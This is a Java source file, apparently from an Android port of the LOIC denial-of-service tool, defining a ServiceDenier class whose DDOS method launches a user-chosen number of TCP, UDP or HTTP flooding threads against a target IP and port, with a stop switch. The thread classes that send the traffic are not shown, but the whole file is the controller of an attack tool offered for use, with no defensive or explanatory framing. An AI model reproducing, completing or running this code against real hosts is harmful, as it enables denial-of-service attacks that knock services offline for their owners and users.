package genius.mohammad.loic;

/**
 * Copyright 2013 Mohammad Adib
 * 
 * Licensed under the Apache License, Version 2.0 (the "License"); you may
 * not use this file except in compliance with the License. You may obtain a
 * copy of the License at
 * 
 * http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations
 * under the License.
 */

public class ServiceDenier {

	public static boolean firing = false;
	
	public static boolean error = false;

	public ServiceDenier() {

	}

	public void DDOS(String ip, int port, int method, int threads, int timeout, String message, int pause) {
		firing = true;
		try {
			switch(method) {
			case 0:
				TCPSocketThread[] socketThreadsTCP = new TCPSocketThread[threads];
				for (int i = 0; i < threads; i++) {
					socketThreadsTCP[i] = new TCPSocketThread(ip, port, timeout, message, pause);
					new Thread(socketThreadsTCP[i]).start();
				}
				break;
			case 1:
				UDPSocketThread[] socketThreadsUDP = new UDPSocketThread[threads];
				for (int i = 0; i < threads; i++) {
					socketThreadsUDP[i] = new UDPSocketThread(ip, port, message, pause);
					new Thread(socketThreadsUDP[i]).start();
				}
				break;
			case 2:
				HTTPSocketThread[] socketThreadsHTTP = new HTTPSocketThread[threads];
				for (int i = 0; i < threads; i++) {
					socketThreadsHTTP[i] = new HTTPSocketThread(ip, timeout, pause);
					new Thread(socketThreadsHTTP[i]).start();
				}
				break;
			}
		} catch (Error e) {
			error = true;
			e.printStackTrace();
		}
	}

	public void stop() {
		firing = false;
	}

}
